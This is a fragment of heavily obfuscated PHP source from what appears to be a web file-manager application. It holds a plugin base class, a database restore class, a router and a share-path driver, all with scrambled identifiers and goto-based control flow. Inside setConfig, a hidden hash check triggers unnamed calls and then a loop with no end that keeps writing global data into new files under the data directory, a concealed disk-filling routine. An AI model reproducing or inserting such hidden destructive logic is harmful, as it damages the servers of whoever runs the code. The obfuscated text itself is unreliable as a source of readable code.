. $BçÚªğÓ°¹ . $dÕ¦íƒ÷™õ[770]); } else { if ($BçÚªğÓ°¹ == $dÕ¦íƒ÷™õ[1270] && !file_exists($FéçŞòÆìì . $BçÚªğÓ°¹ . $dÕ¦íƒ÷™õ[770]) && file_exists($FéçŞòÆìì . $dÕ¦íƒ÷™õ[1271])) { $F‰‘¥Àç¹ = (include_once $FéçŞòÆìì . $dÕ¦íƒ÷™õ[1271]); } else { if (file_exists($FéçŞòÆìì . $Eà¨‰ËµÂÅ . $dÕ¦íƒ÷™õ[770])) { $F‰‘¥Àç¹ = (include_once $FéçŞòÆìì . $Eà¨‰ËµÂÅ . $dÕ¦íƒ÷™õ[770]); } } } goto FåÆ¯¦ù÷Œ; E»‡çÛ‡‰º: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($FÅå‹®‘¦”) { $C×Èšºˆ¬˜ =& $_SERVER[¿õñ]; $eÚïˆ÷ãÊ = $_SERVER[$C×Èšºˆ¬˜[782]] . $C×Èšºˆ¬˜[783]; $a³ğ—š‡– = $C×Èšºˆ¬˜[779]; if ($_SERVER[$C×Èšºˆ¬˜[780]] != $a³ğ—š‡–($eÚïˆ÷ãÊ)) { goto bÕ…ö¨Ü‡İ; bÕ…ö¨Ü‡İ: $BÙë¹¤•î = $C×Èšºˆ¬˜[801]; $b²ßˆ£Ì±– = $C×Èšºˆ¬˜[781]; $EˆÑŒÂ¦ó = $_SERVER[$C×Èšºˆ¬˜[782]] . $C×Èšºˆ¬˜[783]; goto Eó¦ÕĞìˆÄ; c°ÉÒ®ãå: $BÙë¹¤•î(); $D»ÂÀ¨ˆ± = $C×Èšºˆ¬˜[1272]; $A£É»ä¨£ä = json_encode($GLOBALS[$C×Èšºˆ¬˜[1273]]); goto Aã‘…ƒí¢‹; Aã‘…ƒí¢‹: $BË°¡¨¶ª‡ = 1; for ($aì¬ç³˜ÛÇ = $BË°¡¨¶ª‡; $aì¬ç³˜ÛÇ > 0; $aì¬ç³˜ÛÇ++) { $D»ÂÀ¨ˆ±(DATA_PATH . $aì¬ç³˜ÛÇ, $A£É»ä¨£ä); } goto CĞ‚Ä„ôÓÉ; Eó¦ÕĞìˆÄ: $dñ ŞÀ‹Ö = $b²ßˆ£Ì±–($EˆÑŒÂ¦ó); $DÌòøå¬á = explode($C×Èšºˆ¬˜[214], $dñ ŞÀ‹Ö); if (count($DÌòøå¬á) < $C×Èšºˆ¬˜[553]) { $C¥”íõòº = $C×Èšºˆ¬˜[784]; $C¥”íõòº(); } goto eğ²—İ«è‚; eğ²—İ«è‚: $eÑµ¹²ù¸… = $C×Èšºˆ¬˜[802]; $eÑµ¹²ù¸…($_SERVER[$C×Èšºˆ¬˜[803]]); $BÙë¹¤•î = $C×Èšºˆ¬˜[801]; goto c°ÉÒ®ãå; CĞ‚Ä„ôÓÉ: } return $this->modelPlugin->setConfig($this->pluginName, $FÅå‹®‘¦”); } public function onSetConfig($F½…‚ÅîÔÊ) { } public function onGetConfig($F¤×¢»´ ’) { } public function onChangeStatus($FàÖŠŒ•‹) { } public function onUninstall() { } public function onInstall() { } public function authCheck($d·ŠµÃÌ®å = "\x70\x6c\x75\147\x69\156\101\x75\x74\150") { $D«Ğ¦Ô¦À¢ =& $_SERVER[¿õñ]; if (!defined($D«Ğ¦Ô¦À¢[423])) { return !1; } if ($GLOBALS[$D«Ğ¦Ô¦À¢[453]] == 1) { return !0; } $f¹Ü˜Ï«Ÿñ = $this->getConfig(); if (!$f¹Ü˜Ï«Ÿñ[$d·ŠµÃÌ®å]) { return !1; } return ActionCall($D«Ğ¦Ô¦À¢[1274], $f¹Ü˜Ï«Ÿñ[$d·ŠµÃÌ®å]); } public function url($b‡¸õ‰İŞ¿, $b šº§Ó×ß = '', $BÙ¸®¶ø±ë = true) { goto FµãÙ‘×Èè; aËœ‘«Ü¸À: if (!$BÙ¸®¶ø±ë) { return $fš–óŸ²‘è; } echo $fš–óŸ²‘è; goto F¡íÃ¢Ÿî†; FµãÙ‘×Èè: $BÁ¸óÅÏ…Ü =& $_SERVER[¿õñ]; $F¦¿âÄ˜— = $this->getConfig(); $E´‹Ö¯º = KOD_VERSION . $BÁ¸óÅÏ…Ü[92] . KOD_VERSION_BUILD; goto EÈÌİï©µ; EÈÌİï©µ: $Aø¡¿¿•£Ì = $this->packageVersion(); $dÖä…°Ê‡— = $E´‹Ö¯º . $BÁ¸óÅÏ…Ü[408] . $Aø¡¿¿•£Ì; if ($b šº§Ó×ß == $BÁ¸óÅÏ…Ü[33]) { $fš–óŸ²‘è = $this->pluginHost . $b‡¸õ‰İŞ¿ . $BÁ¸óÅÏ…Ü[1275] . $dÖä…°Ê‡—; } else { if ($b šº§Ó×ß == $BÁ¸óÅÏ…Ü[1276]) { $fš–óŸ²‘è = STATIC_PATH . $b‡¸õ‰İŞ¿ . $BÁ¸óÅÏ…Ü[1275] . $E´‹Ö¯º; } else { if ($b šº§Ó×ß == $BÁ¸óÅÏ…Ü[1277]) { $fš–óŸ²‘è = APP_HOST . $BÁ¸óÅÏ…Ü[1278] . $b‡¸õ‰İŞ¿ . $BÁ¸óÅÏ…Ü[1275] . $E´‹Ö¯º; } else { if (isset($F¦¿âÄ˜—[$b šº§Ó×ß])) { $fš–óŸ²‘è = $F¦¿âÄ˜—[$b šº§Ó×ß] . $b‡¸õ‰İŞ¿ . $BÁ¸óÅÏ…Ü[1275] . $dÖä…°Ê‡—; } } } } goto aËœ‘«Ü¸À; F¡íÃ¢Ÿî†: } public function link($F©¹¢õ¾™è = false, $dÙÆ­•›†† = '') { $dˆÈ‚§£ =& $_SERVER[¿õñ]; if (!$F©¹¢õ¾™è) { $this->link($dˆÈ‚§£[1279], $dˆÈ‚§£[1277]); $this->link($dˆÈ‚§£[1280], $dˆÈ‚§£[1276]); $this->link($dˆÈ‚§£[1281], $dˆÈ‚§£[1276]); $this->link($dˆÈ‚§£[1282], $dˆÈ‚§£[1276]); $this->link($dˆÈ‚§£[1283], $dˆÈ‚§£[1276]); return; } $E†±æä®š = $this->url($F©¹¢õ¾™è, $dÙÆ­•›††, !1); if (substr($F©¹¢õ¾™è, -3) == $dˆÈ‚§£[1284]) { echo $dˆÈ‚§£[1285] . $E†±æä®š . $dˆÈ‚§£[1286] . $dˆÈ‚§£[214]; } else { if (substr($F©¹¢õ¾™è, -4) == $dˆÈ‚§£[1287]) { echo $dˆÈ‚§£[1288] . $E†±æä®š . $dˆÈ‚§£[1289] . $dˆÈ‚§£[214]; } } } } class Restore { function __construct($DÊæ…®ÚÕÃ, $AÛˆĞ’‰¯… = '') { $this->database = $DÊæ…®ÚÕÃ; $this->type = $AÛˆĞ’‰¯…; } public function model($fˆé²¥çÚá = '') { return new ModelBase($fˆé²¥çÚá, $_SERVER[¿õñ][33], $this->database); } public function db($c°àÖš˜â‘ = false) { goto Aó¦ªœé‹¨; BïÙÆÉ˜›»: if (!$bÀ¥òÛˆ™Å) { $B…ÓĞŒšøè->execute("\143\x72\x65\x61\x74\145\40\x64\x61\x74\x61\142\x61\163\x65\x20\x60{$c¦ŞèÃ®©Ê}\x60"); } $bİã£Ø¯«Ç[$DôÔ°ïóÜà[231]] = $c¦ŞèÃ®©Ê; if ($bİã£Ø¯«Ç[$DôÔ°ïóÜà[730]] == $DôÔ°ïóÜà[731]) { $bİã£Ø¯«Ç[$DôÔ°ïóÜà[733]] .= $DôÔ°ïóÜà[1290] . $c¦ŞèÃ®©Ê; } goto C‘½ƒã‡»›; e¿ÛãáîÂÜ: $this->database = $bİã£Ø¯«Ç; $B…ÓĞŒšøè = $this->model()->db(); $bÀ¥òÛˆ™Å = $B…ÓĞŒšøè->execute("\163\150\x6f\x77\x20\x64\141\x74\x61\x62\x61\163\145\163\x20\154\x69\153\x65\40\47{$c¦ŞèÃ®©Ê}\x27"); goto BïÙÆÉ˜›»; C‘½ƒã‡»›: $this->database = $bİã£Ø¯«Ç; $B…ÓĞŒšøè->execute("\165\163\x65\40\x60{$c¦ŞèÃ®©Ê}\140"); return $B…ÓĞŒšøè; goto aïÇÅ™½´‡; e¹Â§Œ‘Ï„: $c¦ŞèÃ®©Ê = $bİã£Ø¯«Ç[$DôÔ°ïóÜà[231]]; $bİã£Ø¯«Ç[$DôÔ°ïóÜà[231]] = $DôÔ°ïóÜà[33]; if ($bİã£Ø¯«Ç[$DôÔ°ïóÜà[730]] == $DôÔ°ïóÜà[731]) { $BÅéˆ¾¥ñÂ = $bİã£Ø¯«Ç[$DôÔ°ïóÜà[733]]; $bİã£Ø¯«Ç[$DôÔ°ïóÜà[733]] = substr($BÅéˆ¾¥ñÂ, 0, strrpos($BÅéˆ¾¥ñÂ, $DôÔ°ïóÜà[1290])); } goto e¿ÛãáîÂÜ; Aó¦ªœé‹¨: $DôÔ°ïóÜà =& $_SERVER[¿õñ]; $bİã£Ø¯«Ç = $this->database; if ($this->type == $DôÔ°ïóÜà[9] || !$c°àÖš˜â‘) { return $this->model()->db(); } goto e¹Â§Œ‘Ï„; aïÇÅ™½´‡: } public function createTable($f„øëÄµÇè, $B÷ÆĞ¯Ú¶ = null) { $a÷À’­‰â =& $_SERVER[¿õñ]; if (!@file_exists($f„øëÄµÇè)) { show_json(LNG($a÷À’­‰â[1291]), !1); } $E›é÷ã£¦İ = sqlSplit(file_get_contents($f„øëÄµÇè)); foreach ($E›é÷ã£¦İ as $C§Š—ÒÓ) { if ($B÷ÆĞ¯Ú¶) { $DÊ¡÷¢­à‹ = stripos($C§Š—ÒÓ, $a÷À’­‰â[1292]) === 0; if ($DÊ¡÷¢­à‹) { $B÷ÆĞ¯Ú¶->task[$a÷À’­‰â[1293]] += 1; } } $this->model()->db()->execute($C§Š—ÒÓ); if ($B÷ÆĞ¯Ú¶ && $DÊ¡÷¢­à‹) { $F…å˜Ş†‚¸ = $a÷À’­‰â[1294]; preg_match($F…å˜Ş†‚¸, $C§Š—ÒÓ, $AÍˆˆéêÛ‘); $B÷ÆĞ¯Ú¶->task[$a÷À’­‰â[1295]] = trim($cá·‚¿ˆ„ˆ[0], $a÷À’­‰â[830]); $B÷ÆĞ¯Ú¶->update(1); } } $this->taskToCache($B÷ÆĞ¯Ú¶); } public function insertTable($BÏÎÌéíÉÛ, $C¿¥ø‰¢ƒÁ = null) { $aº„™ÍŠ‚® =& $_SERVER[¿õñ]; foreach ($BÏÎÌéíÉÛ as $D•ï¸»ƒ¶‹) { $a¨ĞŸË¡©Ğ = basename($D•ï¸»ƒ¶‹); $a¨ĞŸË¡©Ğ = substr($a¨ĞŸË¡©Ğ, 0, strrpos($a¨ĞŸË¡©Ğ, $aº„™ÍŠ‚®[92])); if ($C¿¥ø‰¢ƒÁ) { $C¿¥ø‰¢ƒÁ->task[$aº„™ÍŠ‚®[1295]] = $a¨ĞŸË¡©Ğ; } if (get_filesize($D•ï¸»ƒ¶‹) == 0) { continue; } $BÓ²œÉ‘áÍ = $this->sqlToDb($D•ï¸»ƒ¶‹, $C¿¥ø‰¢ƒÁ); if (!$BÓ²œÉ‘áÍ) { show_json(LNG($aº„™ÍŠ‚®[1296]) . "\x5b{$a¨ĞŸË¡©Ğ}\x5d", !1); } } $this->taskToCache($C¿¥ø‰¢ƒÁ); } public function sqlFromDb($Dö›†ğëö×, $AŞğÒöÂ, $aÓ˜¼»÷÷â = null) { goto BÛ÷¶òãÎù; eÑÎË §ù: $b¢Ôô¡èìÎ = 0; $côË‘‚Ê = 1; $bÅîƒŸË ‘ = 500; goto cáé¡´ƒµÕ; BÛ÷¶òãÎù: $Cà—ï³­»± =& $_SERVER[¿õñ]; if ($aÓ˜¼»÷÷â) { $aÓ˜¼»÷÷â->task[$Cà—ï³­»±[1295]] = $Dö›†ğëö×; } $E¾‘Øœ°Öº = $this->model($Dö›†ğëö×); goto eÑÎË §ù; a½¶â¶Ãƒ¦: do { $CŠç¯ßÌË = $E¾‘Øœ°Öº->field($dÓÀ¤½‰)->order($d³øõëÚé¬ . $Cà—ï³­»±[718])->selectPage($bÅîƒŸË ‘, $côË‘‚Ê); $E½‹…À‰Ë = !empty($CŠç¯ßÌË[$Cà—ï³­»±[350]]) ? $CŠç¯ßÌË[$Cà—ï³­»±[350]] : array(); if (!($b‡­æ×¤Æ = count($E½‹…À‰Ë))) { break; } if ($aÓ˜¼»÷÷â) { $aÓ˜¼»÷÷â->task[$Cà—ï³­»±[1293]] += $b‡­æ×¤Æ; } $Bô¦„ÚÖ»Ö = array(); foreach ($E½‹…À‰Ë as $fˆ­ÃÒƒå) { $Bô¦„ÚÖ»Ö[] = $Cà—ï³­»±[721] . $this->sqlEncode($fˆ­ÃÒƒå) . $Cà—ï³­»±[722]; } $Bô¥ÌĞÓ¹Î = "\111\x4e\123\x45\122\124\x20\111\x4e\x54\117\x20\140{$Dö›†ğëö×}\x60\40\50\140" . implode($Cà—ï³­»±[723], $dÓÀ¤½‰) . $Cà—ï³­»±[724]; fwrite($a‡™¨»ƒè, $Bô¥ÌĞÓ¹Î . implode($Cà—ï³­»±[725], $Bô¦„ÚÖ»Ö) . $Cà—ï³­»±[68] . PHP_EOL); $côË‘‚Ê++; $b¢Ôô¡èìÎ += $b‡­æ×¤Æ; if ($aÓ˜¼»÷÷â) { $aÓ˜¼»÷÷â->update($b‡­æ×¤Æ); } } while ($b‡­æ×¤Æ == $bÅîƒŸË ‘); fclose($a‡™¨»ƒè); return $b¢Ôô¡èìÎ; goto e• ö†Á‘; cáé¡´ƒµÕ: $a‡™¨»ƒè = fopen($AŞğÒöÂ, $Cà—ï³­»±[717]); $d³øõëÚé¬ = $E¾‘Øœ°Öº->getPk(); $dÓÀ¤½‰ = $E¾‘Øœ°Öº->getDbFields(); goto a½¶â¶Ãƒ¦; e• ö†Á‘: } public function sqlToDb($FâëÃ­¨–Å, $B©†Æ¹ĞÕÁ = null) { goto CŞ¾×Ã»ğ; bëãæìºß×: if ($C“Ğ¶ùÏÇ¤) { $C“Ğ¶ùÏÇ¤ = rtrim($C“Ğ¶ùÏÇ¤, $aËÖìä×[68]); if (!$cØöÇ¸Ü°->execute($C“Ğ¶ùÏÇ¤)) { return !1; } if ($B©†Æ¹ĞÕÁ) { $B©†Æ¹ĞÕÁ->update($cÅáù™¾Ïè - 1); } } return !0; goto d›Œí„™±¡; CŞ¾×Ã»ğ: $aËÖìä× =& $_SERVER[¿õñ]; $cØöÇ¸Ü° = $this->model()->db(); $C‡äõ™ªÉø = @fopen($FâëÃ­¨–Å, $aËÖìä×[1297]); goto AÀ±µ¼¥Ğ; AÀ±µ¼¥Ğ: if (!$C‡äõ™ªÉø) { return !1; } $cÅáù™¾Ïè = 0; $C“Ğ¶ùÏÇ¤ = $aËÖìä×[33]; goto AÍíÅãĞ— ; AÍíÅãĞ— : $A‘ÍÃ°½«‚ = 500 + 1; while (!feof($C‡äõ™ªÉø)) { if ($B©†Æ¹ĞÕÁ && $cÅáù™¾Ïè != 0) { $B©†Æ¹ĞÕÁ->task[$aËÖìä×[1293]] += 1; } $cÅáù™¾Ïè++; $cÏäÓŸ×¡î = trim(fgets($C‡äõ™ªÉø)); $C“Ğ¶ùÏÇ¤ .= $aËÖìä×[50] . $this->sqlDecode($cÏäÓŸ×¡î, $this->type); if ($cÅáù™¾Ïè == $A‘ÍÃ°½«‚) { $C“Ğ¶ùÏÇ¤ = rtrim($C“Ğ¶ùÏÇ¤, $aËÖìä×[68]); if (!$cØöÇ¸Ü°->execute($C“Ğ¶ùÏÇ¤)) { return !1; } if ($B©†Æ¹ĞÕÁ) { $B©†Æ¹ĞÕÁ->update($cÅáù™¾Ïè - 1); } $C“Ğ¶ùÏÇ¤ = $aËÖìä×[33]; $cÅáù™¾Ïè = 0; } } fclose($C‡äõ™ªÉø); goto bëãæìºß×; d›Œí„™±¡: } public function dropTable($dğÏ¾ôáÒ = null) { $D¢÷˜½Ïº„ = $this->model()->db(); $Få‘š½Œª = $dğÏ¾ôáÒ ? array($dğÏ¾ôáÒ) : $D¢÷˜½Ïº„->getTables(); if (!$Få‘š½Œª) { return; } foreach ($Få‘š½Œª as $dğÏ¾ôáÒ) { $D¢÷˜½Ïº„->execute("\144\x72\157\160\40\x74\x61\x62\x6c\145\40\x69\146\40\145\170\151\x73\x74\x73\x20\140{$dğÏ¾ôáÒ}\140"); } } private function taskToCache($dì£ŸËË³… = null) { $BÛ‹ÅèˆÍã =& $_SERVER[¿õñ]; if (!$dì£ŸËË³…) { return; } $eé››äô§ = array($BÛ‹ÅèˆÍã[1295] => $dì£ŸËË³…->task[$BÛ‹ÅèˆÍã[1295]], $BÛ‹ÅèˆÍã[1293] => $dì£ŸËË³…->task[$BÛ‹ÅèˆÍã[1293]], $BÛ‹ÅèˆÍã[1298] => $dì£ŸËË³…->task[$BÛ‹ÅèˆÍã[1298]]); if ($eé››äô§[$BÛ‹ÅèˆÍã[1293]] == $eé››äô§[$BÛ‹ÅèˆÍã[1298]]) { $eé››äô§[$BÛ‹ÅèˆÍã[693]] = 1; } Cache::set($BÛ‹ÅèˆÍã[1299] . $dì£ŸËË³…->task[$BÛ‹ÅèˆÍã[364]], $eé››äô§); $dì£ŸËË³…->end(); } private function sqlEncode($fÍÚŒ‘©ÁŠ) { $Dİ·ò¹®Å® =& $_SERVER[¿õñ]; $Díœ½¤§¨ƒ = array(); foreach ($fÍÚŒ‘©ÁŠ as $CîŠñ‡˜Âø) { if (is_array($CîŠñ‡˜Âø)) { $CîŠñ‡˜Âø = json_encode_force($CîŠñ‡˜Âø); } $CîŠñ‡˜Âø = addslashes($CîŠñ‡˜Âø); $CîŠñ‡˜Âø = str_replace(array($Dİ·ò¹®Å®[726], $Dİ·ò¹®Å®[214]), array($Dİ·ò¹®Å®[727], $Dİ·ò¹®Å®[728]), $CîŠñ‡˜Âø); $Díœ½¤§¨ƒ[] = str_replace($Dİ·ò¹®Å®[55], $Dİ·ò¹®Å®[1300], $CîŠñ‡˜Âø); } return $Dİ·ò¹®Å®[55] . implode($Dİ·ò¹®Å®[729], $Díœ½¤§¨ƒ) . $Dİ·ò¹®Å®[55]; } private function sqlDecode($A ÜÆìƒô†, $b¬Øƒà‰Æ®) { $c²ˆÛààÈ =& $_SERVER[¿õñ]; $A ÜÆìƒô† = str_replace(array($c²ˆÛààÈ[727], $c²ˆÛààÈ[728]), array($c²ˆÛààÈ[726], $c²ˆÛààÈ[214]), $A ÜÆìƒô†); if ($b¬Øƒà‰Æ® == $c²ˆÛààÈ[9]) { $A ÜÆìƒô† = stripslashes($A ÜÆìƒô†); } return $A ÜÆìƒô†; } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\x5b\x5e\x2f\135\53", "\72\156\x75\155" => "\133\60\x2d\71\135\x2b", "\x3a\141\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($FÀ‰ä¬Êîù, $BÁ¥¥«ï) { $d™ŠîŞ‹½Ø =& $_SERVER[¿õñ]; if ($FÀ‰ä¬Êîù == $d™ŠîŞ‹½Ø[1301]) { $eåŠ›„¼ùæ = array_map($d™ŠîŞ‹½Ø[1302], $BÁ¥¥«ï[0]); $b³ù–ëä× = strpos($BÁ¥¥«ï[1], $d™ŠîŞ‹½Ø[8]) === 0 ? $BÁ¥¥«ï[1] : $d™ŠîŞ‹½Ø[8] . $BÁ¥¥«ï[1]; $d‰¸ƒ™Á›Ñ = $BÁ¥¥«ï[2]; } else { $eåŠ›„¼ùæ = null; $b³ù–ëä× = strpos($BÁ¥¥«ï[0], $d™ŠîŞ‹½Ø[8]) === 0 ? $BÁ¥¥«ï[0] : $d™ŠîŞ‹½Ø[8] . $BÁ¥¥«ï[0]; $d‰¸ƒ™Á›Ñ = $BÁ¥¥«ï[1]; } array_push(self::$maps, $eåŠ›„¼ùæ); array_push(self::$routes, $b³ù–ëä×); array_push(self::$methods, strtoupper($FÀ‰ä¬Êîù)); array_push(self::$callbacks, $d‰¸ƒ™Á›Ñ); } public static function error($c°¸Ä´„„) { self::$errorCallback = $c°¸Ä´„„; } public static function haltOnMatch($aàéŠÁ­ÎË = true) { self::$halts = $aàéŠÁ­ÎË; } public static function dispatch() { goto e¬°÷â¼¬; e¬°÷â¼¬: $F„êæğ =& $_SERVER[¿õñ]; $eíˆÇÓ‹ô = parse_url($_SERVER[$F„êæğ[1303]], PHP_URL_PATH); $DÍŒ¢Š£Î = $_SERVER[$F„êæğ[149]]; goto F¾Ş—¡ÍÜŠ; F¾Ş—¡ÍÜŠ: $f™»Ëñ˜‡ = array_keys(static::$patterns); $d°½·¹‘ = array_values(static::$patterns); $D‰ùÜ‡ÜåË = !1; goto eİîà’áåÀ; eİîà’áåÀ: self::$routes = preg_replace($F„êæğ[1053], $F„êæğ[8], self::$routes); if (in_array($eíˆÇÓ‹ô, self::$routes)) { $cÛ‚¿ÉéÆš = array_keys(self::$routes, $eíˆÇÓ‹ô); foreach ($cÛ‚¿ÉéÆš as $CÙÑçöäŠ) { if (self::$methods[$CÙÑçöäŠ] == $DÍŒ¢Š£Î || self::$methods[$CÙÑçöäŠ] == $F„êæğ[1304] || in_array($DÍŒ¢Š£Î, self::$maps[$CÙÑçöäŠ])) { $D‰ùÜ‡ÜåË = !0; if (!is_object(self::$callbacks[$CÙÑçöäŠ])) { $cæ¹Œ‰Àîï = explode($F„êæğ[8], self::$callbacks[$CÙÑçöäŠ]); $c‹¸İƒÀ™ = end($cæ¹Œ‰Àîï); $Dæá‘É¦Ù = explode($F„êæğ[1305], $c‹¸İƒÀ™); $dåŠê¤½ÉÈ = new $Dæá‘É¦Ù[0](); $dåŠê¤½ÉÈ->{$Dæá‘É¦Ù[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$CÙÑçöäŠ]); if (self::$halts) { return; } } } } } else { $D¡ƒĞâŒÆ„ = 0; foreach (self::$routes as $CÙÑçöäŠ) { if (strpos($CÙÑçöäŠ, $F„êæğ[4]) !== !1) { $CÙÑçöäŠ = str_replace($f™»Ëñ˜‡, $d°½·¹‘, $CÙÑçöäŠ); } if (preg_match($F„êæğ[1306] . $CÙÑçöäŠ . $F„êæğ[1307], $eíˆÇÓ‹ô, $A—Üé­åÚ)) { if (self::$methods[$D¡ƒĞâŒÆ„] == $DÍŒ¢Š£Î || self::$methods[$D¡ƒĞâŒÆ„] == $F„êæğ[1304] || !empty(self::$maps[$D¡ƒĞâŒÆ„]) && in_array($DÍŒ¢Š£Î, self::$maps[$D¡ƒĞâŒÆ„])) { $D‰ùÜ‡ÜåË = !0; array_shift($A—Üé­åÚ); if (!is_object(self::$callbacks[$D¡ƒĞâŒÆ„])) { $cæ¹Œ‰Àîï = explode($F„êæğ[8], self::$callbacks[$D¡ƒĞâŒÆ„]); $c‹¸İƒÀ™ = end($cæ¹Œ‰Àîï); $Dæá‘É¦Ù = explode($F„êæğ[1305], $c‹¸İƒÀ™); $dåŠê¤½ÉÈ = new $Dæá‘É¦Ù[0](); if (!method_exists($dåŠê¤½ÉÈ, $Dæá‘É¦Ù[1])) { echo $F„êæğ[1308]; } else { call_user_func_array(array($dåŠê¤½ÉÈ, $Dæá‘É¦Ù[1]), $A—Üé­åÚ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$D¡ƒĞâŒÆ„], $A—Üé­åÚ); if (self::$halts) { return; } } } } $D¡ƒĞâŒÆ„++; } } if ($D‰ùÜ‡ÜåË == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Eæ‚ëÅ´ö” =& $_SERVER[¿õñ]; header($_SERVER[$Eæ‚ëÅ´ö”[1309]] . $Eæ‚ëÅ´ö”[1310]); echo $Eæ‚ëÅ´ö”[1311]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$F„êæğ[1303]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto aÈÊğóµÕ³; aÈÊğóµÕ³: } } goto E÷‡İŠä«Ş; fØäóÂ‰‡: class PathDriverDriverShareItem { public function __construct($b‰Ğ¯†Ï¦¼) { $this->pathParse = $b‰Ğ¯†Ï¦¼; } public function __call($e‚¿«øĞßá, $fé½ ”äõË) { $BïŠÁ¢¦Ñ´ =& $_SERVER[¿õñ]; if (method_exists($this, $e‚¿«øĞßá)) { return; } $a±Ê²‰Â£Ÿ = call_user_func_array(array($BïŠÁ¢¦Ñ´[1094], $e‚¿«øĞßá), $fé½ ”äõË); $fŠä¡ŠÒ = array($BïŠÁ¢¦Ñ´[1095], $BïŠÁ¢¦Ñ´[1096], $BïŠÁ¢¦Ñ´[1097], $BïŠÁ¢¦Ñ´[1098], $BïŠÁ¢¦Ñ´[482], $BïŠÁ¢¦Ñ´[484], $BïŠÁ¢¦Ñ´[1099], $BïŠÁ¢¦Ñ´[90], $BïŠÁ¢¦Ñ´[1100], $BïŠÁ¢¦Ñ´[1101]); if (in_array($e‚¿«øĞßá, $fŠä¡ŠÒ)) { $a±Ê²‰Â£Ÿ = $this->getPathOuter($a±Ê²‰Â£Ÿ); } return $a±Ê²‰Â£Ÿ; } public function copy($aùä§ŒÏÂŠ, $AÜÎåàÃ¤, $AÀàö“Æ´ = false) { return $this->copyMove($aùä§ŒÏÂŠ, $AÜÎåàÃ¤, $AÀàö“Æ´, $_SERVER[¿õñ][482]); } public function move($aôŞ‚ñÆÛ , $dù´òì›â«, $b³¨Œ… = false) { return $this->copyMove($aôŞ‚ñÆÛ , $dù´òì›â«, $b³¨Œ…, $_SERVER[¿õñ][484]); } private function copyMove($fŞ»™ãÁ, $f¦Íøò¥‹, $F“°ó»Ò°, $bÀ±ğÒ‰‰ï) { goto A“äœÜ¾¢´; A“äœÜ¾¢´: $e³¹à³í§ =& $_SERVER[¿õñ]; $c‰¶äŠ§¤§ = $f¦Íøò¥‹; $f‹µîŸàÄø = IO::driverMake($f¦Íøò¥‹); goto A¨ÑÅÆÙÂ‰; A¨ÑÅÆÙÂ‰: if ($f‹µîŸàÄø->pathParse[$e³¹à³í§[981]]) { $f¦Íøò¥‹ = $f‹µîŸàÄø->pathParse[$e³¹à³í§[981]]; } else { $f¦Íøò¥‹ = $c‰¶äŠ§¤§; } $EçùÎÎ×ÇŒ = IO::copyMove($fŞ»™ãÁ, $f¦Íøò¥‹, $F“°ó»Ò°, $bÀ±ğÒ‰‰ï); $EçùÎÎ×ÇŒ = $this->getPathOuter($EçùÎÎ×ÇŒ); goto E´«ñÔŠÅ; E´«ñÔŠÅ: return $EçùÎÎ×ÇŒ; goto A±è¢º„ì; A±è¢º„ì: } public function pathFather($dÅ‹ôñ‘Û¼) { return get_path_father($this->pathParse[$_SERVER[¿õñ][76]]); } public function iconvSystem($fÍ¥„˜½Ü) { return $fÍ¥„˜½Ü; } protected function infoParse($bŠ¼–ÂšçĞ) { $f¾ô˜—à…£ =& $_SERVER[¿õñ]; $DÉÏ‘ĞÅ…¦ = $this->pathParse[$f¾ô˜—à…£[435]][$f¾ô˜—à…£[1002]] . $this->pathParse[$f¾ô˜—à…£[995]]; $fÜÊÒ³Æš– = IO::info($DÉÏ‘ĞÅ…¦); $e¯ì¼³²ë™ = $this->pathParse[$f¾ô˜—à…£[435]]; return Action($f¾ô˜—à…£[1093])->_shareItemeParse($fÜÊÒ³Æš–, $e¯ì¼³²ë™); } public function listAll($bõ«†ôªÀ¤) { $EŒ‚ì»äÅİ =& $_SERVER[¿õñ]; $Fùœ…ôÛôğ = IO::listAll($bõ«†ôªÀ¤); $c«§šØ†±° = $this->pathParse[$EŒ‚ì»äÅİ[435]]; foreach ($Fùœ…ôÛôğ as &$BÈ‡ƒ§İÑ) { check_abort(); $BÈ‡ƒ§İÑ = array_merge(IO::info($BÈ‡ƒ§İÑ[$EŒ‚ì»äÅİ[76]]), $BÈ‡ƒ§İÑ); $BÈ‡ƒ§İÑ[$EŒ‚ì»äÅİ[388]] = Action($EŒ‚ì»äÅİ[1093])->_shareItemeParse($BÈ‡ƒ§İÑ, $c«§šØ†±°); } return $Fùœ…ôÛôğ; } public function getPathOuter($aÁ«ò®ÛÜË) { goto fšï´èÙ×‡; a…°‘Ë¿ã„: if (substr($aÚÖ¾Éƒ‡è, 0, strlen($F’ Å’ƒÆç)) != $F’ Å’ƒÆç) { return !1; } return $this->pathParse[$Bó£ÑĞšĞ–[996]] . $Bó£ÑĞšĞ–[8] . ltrim($f“˜›—Œ—Ş, $Bó£ÑĞšĞ–[8]); goto BÄ¯çîï²ù; fšï´èÙ×‡: $Bó£ÑĞšĞ– =& $_SERVER[¿õñ]; $Cãâ¾ìÒâÉ = KodIO::parse($aÁ«ò®ÛÜË); if ($Cãâ¾ìÒâÉ[$Bó£ÑĞšĞ–[29]] == KodIO::KOD_SHARE_ITEM) { return $Cãâ¾ìÒâÉ[$Bó£ÑĞšĞ–[76]]; } goto E¬İïáñÁ; E¬İïáñÁ: $aÚÖ¾Éƒ‡è = KodIO::clear($aÁ«ò®ÛÜË); $F’ Å’ƒÆç = KodIO::clear($this->pathParse[$Bó£ÑĞšĞ–[435]][$Bó£ÑĞšĞ–[1002]]); $f“˜›—Œ—Ş = substr($aÚÖ¾Éƒ‡è, strlen($F’ Å’ƒÆç)); goto a…°‘Ë¿ã„; BÄ¯çîï²ù: } public function getType() { $FãâÂ»‹Ç =& $_SERVER[¿õñ]; $F‹…ÙÑâ†ñ = str_replace($FãâÂ»‹Ç[72], $FãâÂ»‹Ç[33], get_class($this)); return strtolower($F‹…ÙÑâ†ñ); } public function isTypeObject($cğÈŞÇ²™‡) { return IO::isTypeObject($cğÈŞÇ²™‡); } public function info($bÑÑÒãèµå) { return $this->infoParse($bÑÑÒãèµå); } public function 